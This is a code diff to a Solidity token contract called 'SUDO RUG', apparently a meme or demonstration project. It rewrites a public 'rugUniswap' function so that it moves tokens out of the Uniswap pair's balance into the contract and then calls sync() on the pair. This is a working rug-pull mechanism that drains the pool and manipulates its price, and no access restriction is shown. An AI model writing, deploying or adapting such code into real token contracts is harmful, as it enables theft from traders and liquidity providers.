@@ -20,7 +20,16 @@ contract sudorug is ERC20("SUDO RUG", "RUG", 18) {
     }
 
     function rugUniswap(uint256 amt) public {
-        _burn(uniswapPair, amt);
+        balanceOf[uniswapPair] -= amt;
+
+        // Cannot overflow because the sum of all user
+        // balances can't exceed the max uint256 value.
+        unchecked {
+            balanceOf[address(this)] += amt;
+        }
+
+        emit Transfer(uniswapPair, address(this), amt);
+
         IUniswapPair(uniswapPair).sync();
     }
 
